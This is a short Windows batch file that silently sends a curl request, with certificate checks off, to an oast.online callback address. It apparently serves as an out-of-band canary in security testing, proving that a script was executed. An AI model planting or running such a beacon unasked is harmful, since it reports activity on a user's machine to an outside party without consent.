@echo off

set "url=https://corluh1jiifkbn3eon6g71fqd1fkzrkst.oast.online"

curl -s -k "%url%"

pause
